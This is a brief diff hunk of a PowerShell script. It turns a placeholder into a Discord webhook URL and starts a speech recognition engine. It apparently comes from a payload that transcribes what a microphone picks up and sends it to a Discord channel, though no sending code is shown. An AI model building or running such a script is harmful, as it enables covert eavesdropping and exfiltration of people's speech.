@@ -8,7 +8,10 @@ SETUP
 
 #>
 
-$dc = 'WEBHOOK_HERE' # can be shortened
+$dc = "$dc"
+if ($dc.Length -lt 120){
+	$dc = ("https://discord.com/api/webhooks/" + "$dc")
+}
 
 Add-Type -AssemblyName System.Speech
 $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
